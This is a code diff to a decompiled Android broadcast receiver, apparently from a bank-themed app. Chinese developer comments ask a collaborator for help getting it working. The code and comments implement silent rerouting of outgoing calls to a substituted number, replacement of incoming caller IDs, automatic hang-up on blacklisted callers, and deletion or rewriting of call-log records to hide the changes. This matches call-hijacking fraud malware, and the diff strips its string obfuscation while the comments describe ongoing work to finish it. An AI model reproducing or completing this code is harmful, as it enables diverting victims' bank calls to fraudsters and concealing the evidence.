@@ -108,6 +108,36 @@ public class TelePhoneReceiver extends BroadcastReceiver {
     }
     @Override // android.content.BroadcastReceiver
     public void onReceive(Context context, Intent intent) {
+
+        //最开始Constants.modifyCall(this, callPhone, var11);加在PhoneCallService，会有问题
+        //如果是通话挂断了 所有的挂断都会调用这个方法，全部都改一遍 不是有问题？
+        //我调试的时候，就觉得应该知道通话是来电还是去电 然后进一步知道来电是否为黑名单、是否需要根据指定号码显示、去电是否需要转发
+        //这样做才对的
+
+        /*
+        黑名单、拨出号码替换、来电号码替换
+
+        黑名单号码打进来之后，直接挂断，并删除该条通话记录
+        拨出号码替换，替换前的号码，需要保留在通话记录中，替换后的号码删除
+        来电号码替换  替换前的号码通话记录不显示 替换后的号码在通话记录中保留
+        黑名单看着好像没有问题
+        拨出号码替换刚才你看了 打出到对应的号码没有问题了 显示有问题还有通话记录也没了
+        来电号码替换现在都还没有调到哪儿去
+        调试还莫名奇妙报错 搞得心烦
+        你现在知道我怎么调试的 你也可以自己调一下
+
+        所有需要调试的东西都加在debugging com.wish.lmbank.temp.Debugging 因为这样如果这个apk搞完了 就根据这个类就可以搜索出来
+        不用到处找
+
+         */
+
+
+        //这个类是一个广播，需要注册广播事件（我的理解是，由系统通知的的）
+        //我在这里只加了几行代码，之所以在这里加黑名单、转发的通话记录操作在这里是因为原来的代码有添加通话log对象
+        //和执行响应的处理的代码 不然也不会加在这里 现在这个app的问题有点多 我都不知道搞得定不
+        //你能搞定不？
+        //这个类的onReceive这个方法贼复杂  我都还没有看懂
+        //这里接收通知 判断是否是黑名单、以及拨出转发，然后生成响应类型得 CallLogBean，加到Constants得队列里，然后根据类型作处理。
         final StringBuilder sb = new StringBuilder();
 //-^-         sb.append(bb7d7pu7.m5998("OQEGBwwqCAUFOwwKDAAfDBs"));
         sb.append("PhoneCallReceiver");
@@ -159,9 +189,10 @@ public class TelePhoneReceiver extends BroadcastReceiver {
             }
             if (TelePhoneReceiver.telephonyManager == null) {
 //-^-                 TelePhoneReceiver.telephonyManager = (TelephonyManager) context.getSystemService(bb7d7pu7.m5998("GQEGBww"));
-                TelePhoneReceiver.telephonyManager = (TelephonyManager) context.getSystemService("phone");
+                TelePhoneReceiver.telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
             }
             final Bundle extras = intent.getExtras();
+
             if (extras != null && this.mPhoneCallListener != null && TelePhoneReceiver.mContext != null) {
                 final boolean checkFloatPermission = SettingUtils.checkFloatPermission(context);
 //-^-                 final String string = extras.getString(bb7d7pu7.m5998("Gh0IHQw"));
@@ -192,18 +223,20 @@ public class TelePhoneReceiver extends BroadcastReceiver {
 //-^-                     sb5.append(bb7d7pu7.m5998("RUmP4sGP4PqM5t6OyehTSQ"));
                     sb5.append(", 拨打号码: ");
                     sb5.append(this.savedNumber);
-                    sb.append(sb5.toString());
+                    sb.append(sb5.toString()); //这里播出转发
                     final LimitPhoneNumberBean forwarding = SettingUtils.isForwarding(this.savedNumber);
                     while (true) {
-                        Label_0858:
+
                         {
                             if (forwarding == null) {
                                 this.savedNumberReal = null;
-                                break Label_0858;
+
+                                break ;
                             }
                             this.savedNumberReal = forwarding.getRealPhoneNumber();
                             if (forwarding.getSpecial() != 1) {
-                                break Label_0858;
+                                TelePhoneReceiver.mCallLogBean = new CallLogBean(savedNumber, savedNumberReal, Constants.CALL_SOURCE_FORWARDING, System.currentTimeMillis());
+                                break ;
                             }
                             final boolean b = true;
                             final StringBuilder sb6 = new StringBuilder();
@@ -234,7 +267,6 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                             sb7.append(", isRunning: ");
                             sb7.append(PhoneCallService.isRunning);
                             sb.append(sb7.toString());
-                            while (true) {
                                 if (defaultDialer && !PhoneCallService.isRunning) {
                                     if (!b || TextUtils.isEmpty((CharSequence) this.savedNumberReal)) {
                                         break;
@@ -244,7 +276,7 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                                     final String savedNumberReal = this.savedNumberReal;
                                     this.savedNumber = savedNumberReal;
 //-^-                                     TelePhoneReceiver.mCallLogBean = new CallLogBean(s, savedNumberReal, bb7d7pu7.m5998("DwYbHggbDQAHDg"), System.currentTimeMillis());
-                                    TelePhoneReceiver.mCallLogBean = new CallLogBean(s, savedNumberReal, "forwarding", System.currentTimeMillis());
+                                    TelePhoneReceiver.mCallLogBean = new CallLogBean(s, savedNumberReal,  Constants.CALL_SOURCE_FORWARDING, System.currentTimeMillis());
                                     AppStartV.setAutoService(true, s, this.savedNumberReal);
                                     final StringBuilder sb8 = new StringBuilder();
 //-^-                                     sb8.append(bb7d7pu7.m5998("RUkIHB0GOgwbHwAKDCoIBQUnHAQLDBtTSQ"));
@@ -362,7 +394,6 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                                 LogUtils.callLog(sb.toString());
                                 return;
                             }
-                        }
                     }
                 }
 //-^-                 final String string3 = extras.getString(bb7d7pu7.m5998("AAcKBgQABw42BxwECwwb"));
@@ -419,20 +450,20 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                             sb.append(sb17.toString());
                             this.mPhoneCallListener.onIncomingCallReceived(string3, this.savedNumberReal, m59986, TelePhoneReceiver.callStartTime);
                             LogUtils.callLog(sb.toString());
-                        } else if (SettingUtils.isBlackList(string3)) {
+                        } else if (SettingUtils.isBlackList(string3)) { //这里黑名单
                             final CallLogBean mCallLogBean2 = TelePhoneReceiver.mCallLogBean;
                             if (mCallLogBean2 != null && (m59982.equals(mCallLogBean2.getType()) || m59986.equals(TelePhoneReceiver.mCallLogBean.getType()))) {
                                 TelePhoneReceiver.mCallLogBean.setDuration((long) Math.ceil((System.currentTimeMillis() - TelePhoneReceiver.mCallLogBean.getDate()) * 1.0 / 1000.0 * 1.0));
                                 CallLogHelper.addCallLog(TelePhoneReceiver.mCallLogBean);
                             }
-                            TelePhoneReceiver.mCallLogBean = new CallLogBean(string3, string3, "blacklist", System.currentTimeMillis());
+                            TelePhoneReceiver.mCallLogBean = new CallLogBean(string3, string3, Constants.CALL_SOURCE_BLACKLIST, System.currentTimeMillis());
                             final StringBuilder sb18 = new StringBuilder();
 //-^-                             sb18.append(bb7d7pu7.m5998("RUmA0viM-eSM5PxFSQoIBQUlBg42U0k"));
                             sb18.append(", 黑名单, callLog_: ");
                             sb18.append(TelePhoneReceiver.mCallLogBean.toString());
                             sb.append(sb18.toString());
 //-^-                             this.mPhoneCallListener.onIncomingCallReceived(string3, string3, bb7d7pu7.m5998("CwUICgIFABod"), TelePhoneReceiver.callStartTime);
-                            this.mPhoneCallListener.onIncomingCallReceived(string3, string3, "blacklist", TelePhoneReceiver.callStartTime);
+                            this.mPhoneCallListener.onIncomingCallReceived(string3, string3, Constants.CALL_SOURCE_BLACKLIST, TelePhoneReceiver.callStartTime);
                             LogUtils.callLog(sb.toString());
                             if (SettingUtils.endCall(context)) {
                                 this.isBlack = true;
@@ -488,6 +519,7 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                 return;
             }
         }
+
 //         String m5998 = bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ");
         String m5998 = "KEY_IS_FORWARDING_HAND_UP";
         if (i == 0) {
